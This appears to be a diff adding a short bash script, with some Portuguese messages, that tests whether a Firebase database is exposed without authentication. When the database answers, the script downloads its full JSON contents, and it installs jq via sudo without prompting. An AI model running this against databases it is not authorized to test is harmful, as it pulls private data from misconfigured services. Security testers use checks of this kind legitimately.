@@ -1,0 +1,37 @@
+#!/bin/bash
+
+echo "Tool for validate Firebase DB Exposed vulnerability"
+
+while getopts "u:a:o:f:h" OPT;do
+case "$OPT" in
+	u) url=$OPTARG;;
+	a) archive=$OPTARG;;
+	o) output=$OPTARG;;
+esac
+done
+
+if [ -e /usr/bin/jq ]
+then
+	echo
+else
+	echo "Primeira vez por aqui? Instalando um editorzinho para melhorar a visualização do JSON"
+ 	echo " "
+	sudo apt install jq -qq -y
+fi
+
+if [ -z "$1" ]
+then
+	echo "$0 -u <url> -a <archive-for-download> (Default /.js) -o <output-file-name> "
+else 
+if [ `curl -o /dev/null -s -w "%{http_code}\n" https://$url/$archive.json` = "200" ]
+then
+        echo " "
+	echo "[!] - Vulnerable \o/ ! Downloading informations..."
+        curl -s https://$url/$archive.json -o info.json && cat info.json| jq > $output.json && rm info.json
+else
+        echo " "
+	echo "[+] - It's not vulnerable :("
+fi
+fi
+
+#fil
